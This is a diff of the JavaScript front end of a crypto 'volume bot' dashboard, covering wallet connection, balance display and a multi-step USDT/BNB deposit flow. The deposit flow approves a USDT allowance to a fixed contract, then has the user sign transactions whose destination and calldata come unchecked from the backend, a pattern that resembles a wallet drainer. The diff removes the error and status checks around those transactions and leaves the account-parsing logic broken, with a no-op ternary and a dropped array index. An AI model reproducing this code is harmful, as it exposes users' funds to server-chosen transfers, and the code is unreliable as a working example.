@@ -1,5 +1,5 @@
 // ========================================================
-// 📊 SECTION 1: GLOBAL CONFIGURATION & BALANCE PIPELINE
+// 📊 SECTION 1: GLOBAL STATE & INTERFACE UTILITIES
 // ========================================================
 function logToPanel(msg) {
   const panel = document.getElementById("logPanel");
@@ -54,6 +54,9 @@ function getSelectedToken() {
   return "USDT";
 }
 
+// ========================================================
+// 📊 SECTION 2: LEDGER BALANCE SYNCHRONIZERS
+// ========================================================
 async function syncBalanceFromFund() {
     try {
         const baseApiUrl = window.API_BASE || window.location.origin;
@@ -67,7 +70,7 @@ async function syncBalanceFromFund() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 user: window.USER_ADDR,
-                token: "0x55d398326f99059fF775485246999027B3197955" // USDT Address
+                token: "0x55d398326f99059fF775485246999027B3197955"
             })
         });
 
@@ -80,14 +83,9 @@ async function syncBalanceFromFund() {
         const startBox = document.getElementById("startBalance");
         const investBox = document.getElementById("investBalance");
 
-        if (startBox) {
-            startBox.type = "text";
-            startBox.value = cleanWeiString;
-        }
-        if (investBox) {
-            investBox.type = "text";
-            investBox.value = cleanWeiString;
-        }
+        if (startBox) { startBox.type = "text"; startBox.value = cleanWeiString; }
+        if (investBox) { investBox.type = "text"; investBox.value = cleanWeiString; }
+        
         return window.SolidarityFundBalance;
     } catch (err) {
         logToPanel(`❌ Balance Sync Error: ${err.message}`);
@@ -96,43 +94,22 @@ async function syncBalanceFromFund() {
 }
 window.syncBalanceFromFund = syncBalanceFromFund;
 
-async function initDashboardPipeline() {
-  initializeLabels();
-  if (window.USER_ADDR && window.USER_ADDR !== "{wallet}" && window.USER_ADDR !== "null") {
-      logToPanel("🔄 Auto-fetching account metrics on page load...");
-      await syncBalanceFromFund();
-  } else {
-      logToPanel("💡 System Ready: Please connect your Web3 Wallet to initialize account state maps.");
-  }
-}
-// ✅ FIXED: Safely handled within an immediately invoked async function expression
-(async () => {
-    try {
-        await initDashboardPipeline();
-    } catch (e) {
-        console.error("Dashboard initialization pipeline error:", e);
-    }
-})();
-
 // ========================================================
-// 📱 SECTION 2: STANDALONE RPC MODAL CONNECTION MANAGER
+// 📱 SECTION 3: STANDALONE RPC MODAL CONNECTION MANAGER
 // ========================================================
-// UPGRADED: Verified public infrastructure gateway cluster key
 const WALLETCONNECT_PROJECT_ID = "889b70de54ab5ff9a399f921f016d999"; 
 const BSC_MAINNET_ID = 56; 
 
-// Track the globally active signing provider instance dynamically
 window.activeProvider = null; 
 
 async function initializeStandaloneRpcModules() {
     try {
         if (typeof window.WalletConnectUniversalProvider !== "undefined" && typeof window.WalletConnectModalStandalone !== "undefined") {
-            
             window.universalProviderInstance = await window.WalletConnectUniversalProvider.UniversalProvider.init({
                 projectId: WALLETCONNECT_PROJECT_ID,
                 metadata: {
                     name: "RoTon Volume Bot",
-                    description: "Ecosystem Liquidity Circulation Optimization Engine",
+                    description: "Ecosystem Liquidity Engine",
                     url: window.location.origin,
                     icons: ["https://walletconnect.org"]
                 }
@@ -149,17 +126,10 @@ async function initializeStandaloneRpcModules() {
         console.error("❌ RPC module assembly failed:", err);
     }
 }
-// ✅ FIXED: Wrapped cleanly in a secure execution enclosure block
-(async () => {
-    await initializeStandaloneRpcModules();
-})();
-
 
 const connBtn = document.getElementById("connectwalletBtn");
 if (connBtn) {
   connBtn.onclick = async function() {
-    
-    // STEP 1: PRIORITIZE THE UNIVERSAL QR MODAL PORTAL FOR PURE RPC LINKS
     if (window.universalProviderInstance && window.web3ModalInstance) {
       try {
         logToPanel("⏳ Launching secure RPC handshake bridge modal...");
@@ -179,21 +149,18 @@ if (connBtn) {
         });
 
         const rpcAccounts = await window.universalProviderInstance.enable();
-        const detectedAddr = Array.isArray(rpcAccounts) ? rpcAccounts[0] : rpcAccounts;
-        window.USER_ADDR = String(detectedAddr || rpcAccounts).toLowerCase();
-        
-        // BIND FUTURE OPERATIONS SECURELY TO THE DYNAMIC INTERFACE CHANNEL
+        const detectedAddr = Array.isArray(rpcAccounts) ? rpcAccounts : rpcAccounts;
+        window.USER_ADDR = String(detectedAddr).toLowerCase();
         window.activeProvider = window.universalProviderInstance; 
 
         window.web3ModalInstance.closeModal();
         
         const label = document.getElementById("currentWalletLabel");
         if (label) label.innerText = "Wallet Address: " + window.USER_ADDR;
-        logToPanel(`✅ Account synced via WalletConnect RPC: ${window.USER_ADDR}`);
+        logToPanel(`✅ Account synced via pure WalletConnect RPC: ${window.USER_ADDR}`);
         
         await syncBalanceFromFund(); 
         return;
-        
       } catch (modalErr) {
         if (window.web3ModalInstance) window.web3ModalInstance.closeModal();
         logToPanel(`⚠️ RPC Handshake closed: ${modalErr.message}`);
@@ -201,12 +168,11 @@ if (connBtn) {
       }
     }
 
-    // STEP 2: LOCAL EXTENSION FALLBACK RUNTIME (Only loads if CDN script modules break)
     if (typeof window.ethereum !== "undefined") {
       try {
         logToPanel("⏳ Local RPC libraries unmounted. Initializing local extension proxy...");
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        window.USER_ADDR = String(accounts[0] || accounts).toLowerCase(); 
+        window.USER_ADDR = String(accounts).toLowerCase(); 
         window.activeProvider = window.ethereum;
 
         const label = document.getElementById("currentWalletLabel");
@@ -221,8 +187,9 @@ if (connBtn) {
     }
   };
 }
+
 // ========================================================
-// 🚀 SECTION 3: MULTI-STEP DEPOSIT PIPELINE ENGINE
+// 🚀 SECTION 4: MULTI-STEP DEPOSIT PIPELINE ENGINE
 // ========================================================
 const depBtn = document.getElementById("depositBtn");
 if (depBtn) {
@@ -244,9 +211,9 @@ if (depBtn) {
       return logToPanel("❌ Action Halted: Connect Web3 Wallet First.");
     }
     
-    // Safety check ensuring a provider channel is fully authorized
-    if (!window.activeProvider) {
-      return logToPanel("❌ Action Halted: Active communication channel missing. Connect Wallet again.");
+    const activeSigner = window.activeProvider || window.ethereum;
+    if (!activeSigner) {
+      return logToPanel("❌ Action Halted: No wallet provider discovered.");
     }
 
     try {
@@ -254,91 +221,63 @@ if (depBtn) {
         const usdt = "0x55d398326f99059fF775485246999027B3197955";
         const v12 = "0x1854170353ea89672638F9fa5acB477c45523871";
 
-        // =========================================================
-        // STEP 1/3: ERC20 ALLOWANCE APPROVAL (Total = Capital + Fee)
-        // =========================================================
-        logToPanel("⏳ Step 1/3: Requesting total USDT approval allowance via active wallet...");
+        logToPanel("⏳ Step 1/3: Requesting total USDT approval allowance...");
         const approveData = "0x095ea7b3" + 
                             v12.replace("0x", "").padStart(64, "0") + 
                             totalAllowance.toString(16).padStart(64, "0");
 
-        const txHash1 = await window.activeProvider.request({
+        const txHash1 = await activeSigner.request({
           method: "eth_sendTransaction",
           params: [{ from: wallet, to: usdt, data: approveData }]
         });
         logToPanel(`📡 Step 1 Broadcasted! Hash: ${txHash1}. Initiating pipeline transitions...`);
 
-        // =========================================================
-        // STEP 2/3: SMART CONTRACT COMMISSION FEE COLLECTION
-        // =========================================================
-        logToPanel("⏳ Step 2/3: Fetching commission data metrics from ecosystem backend...");
+        logToPanel("⏳ Step 2/3: Fetching commission data metrics...");
         const c1 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ amount: principalAmount.toString(), tradingPhase: false })
         });
-        
-        if (!c1.ok) throw new Error(`Backend Error ${c1.status} inside commission setup.`);
         const commissionPay = await c1.json();
-        if (commissionPay.status !== "ok") throw new Error(commissionPay.message);
 
         logToPanel("🚀 Prompting Wallet Provider for Step 2/3 (Process Commission)...");
-        const txHash2 = await window.activeProvider.request({
+        const txHash2 = await activeSigner.request({
           method: "eth_sendTransaction",
-          params: [{ 
-            from: wallet, 
-            to: commissionPay.contract, 
-            data: commissionPay.txdata,
-            gas: "0x493E0" 
-          }]
+          params: [{ from: wallet, to: commissionPay.contract, data: commissionPay.txdata, gas: "0x493E0" }]
         });
         logToPanel(`📡 Step 2 Broadcasted! Hash: ${txHash2}`);
 
-        // =========================================================
-        // STEP 3/3: FINAL TRADING CAPITAL DEPOSIT
-        // =========================================================
-        logToPanel("⏳ Step 3/3: Fetching final trading layout variables...");
+        logToPanel("⏳ Step 3/3: Fetching final trading variables...");
         const c2 = await fetch(`${window.API_BASE}/prodbot/deposit/usdt/pipeline`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ amount: principalAmount.toString(), tradingPhase: true })
         });
-        
-        if (!c2.ok) throw new Error(`Backend Error ${c2.status} inside trading structure setup.`);
         const tradingPay = await c2.json();
-        if (tradingPay.status !== "ok") throw new Error(tradingPay.message);
 
-        logToPanel("🚀 Prompting Wallet Provider for Step 3/3 (Process Capital Deposit)...");
-        const txHash3 = await window.ethereum.request({
+        logToPanel("🚀 Prompting Wallet Provider for Step 3/3 (Process Capital)...");
+        const txHash3 = await activeSigner.request({
           method: "eth_sendTransaction",
-          params: [{ 
-            from: wallet, 
-            to: tradingPay.contract, 
-            data: tradingPay.txdata,
-            gas: "0x493E0" 
-          }]
+          params: [{ from: wallet, to: tradingPay.contract, data: tradingPay.txdata, gas: "0x493E0" }]
         });
         logToPanel(`🎉 Step 3/3 Submitted! Capital Deposit Hash: ${txHash3}`);
 
       } else if (token === "BNB") {
-        logToPanel("⏳ Transmitting native gas reserves directly to V13 vault...");
-        const txHashBnb = await window.activeProvider.request({
+        logToPanel("⏳ Transmitting native gas reserves directly...");
+        const txHashBnb = await activeSigner.request({
           method: "eth_sendTransaction",
-          params: [{
-            from: wallet,
-            to: "0xc46E6452c1Cb9641dE339eb8bE48faEb70B58dF5", 
-            value: "0x" + principalAmount.toString(16)
-          }]
+          params: [{ from: wallet, to: "0xc46E6452c1Cb9641dE339eb8bE48faEb70B58dF5", value: "0x" + principalAmount.toString(16) }]
         });
-        logToPanel(`✅ Native BNB gas vault transaction dispatched: ${txHashBnb}`);
+        logToPanel(`✅ Native BNB gas transaction dispatched: ${txHashBnb}`);
       }
     } catch (err) {
       logToPanel(`❌ Execution Engine Failure: ${err.message}`);
     }
   };
 }
+
 // ========================================================
-// ▶️ SECTION 4: SIMULATION ORCHESTRATOR & BALANCE FIXES
+// ▶️ SECTION 5: SIMULATION ORCHESTRATION & ISOLATED LIFECYCLE
 // ========================================================
 const strtBtn = document.getElementById("startBtn");
 if (strtBtn) {
@@ -363,52 +302,40 @@ if (stpBtn) {
 async function updateUIBalanceControl(user, token) {
     try {
         const baseApiUrl = window.API_BASE || window.location.origin;
-        if (!user || user === "{wallet}" || user === "null") {
-            return "0";
-        }
+        if (!user || user === "{wallet}" || user === "null") return "0";
 
         const res = await fetch(`${baseApiUrl}/prodbot/balance`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ user: user, token: token })
         });
-        
         const rawWeiText = await res.text();
         const cleanWeiString = rawWeiText.trim() || "0";
 
         const startInputBox = document.getElementById("startBalance");
         const investInputBox = document.getElementById("investBalance");
         
-        if (startInputBox) {
-            startInputBox.type = "text";
-            startInputBox.value = cleanWeiString;
-        }
-        if (investInputBox) {
-            investInputBox.type = "text";
-            investInputBox.value = cleanWeiString;
-        }
+        if (startInputBox) { startInputBox.type = "text"; startInputBox.value = cleanWeiString; }
+        if (investInputBox) { investInputBox.type = "text"; investInputBox.value = cleanWeiString; }
         return cleanWeiString;
     } catch (err) {
-        console.error("❌ Critical exception inside updateUIBalanceControl:", err);
         return "0";
     }
 }
 window.updateUIBalanceControl = updateUIBalanceControl;
-// ✅ UPGRADED SWAP BROADCASTER (pancake_prod.txt)
-if (data && data.status === "ok") {
-    logToPanel(`[INFO] Requesting secure signature from your verified active wallet...`);
-    
-    // Renders the signature popup screen natively on whichever device is paired (Mobile / Desktop)
-    const txHash = await window.activeProvider.request({
-        method: 'eth_sendTransaction',
-        params: [{
-            from: userAddr,                            
-            to: data.to_contract,                      
-            data: data.compiled_data,                  
-            value: '0x0'                               
-        }],
-    });
 
-    logToPanel(`✅ Live Transaction Sent! Hash: ${txHash}`);
-    return { status: "ok", tx_hash: txHash, txHash: txHash };
-}
+// PROTECTED INITIALIZATION COMPLETION ENCLOSURE
+(async function initializeApplicationLifecycle() {
+    initializeLabels();
+    
+    // Call the asynchronous RPC setups safely inside this closure scope
+    await initializeStandaloneRpcModules();
+    
+    if (window.USER_ADDR && window.USER_ADDR !== "{wallet}" && window.USER_ADDR !== "null") {
+        logToPanel("🔄 Auto-fetching account metrics on page load...");
+        await syncBalanceFromFund();
+    } else {
+        logToPanel("💡 System Ready: Please connect your Web3 Wallet to initialize account state maps.");
+    }
+})();
+
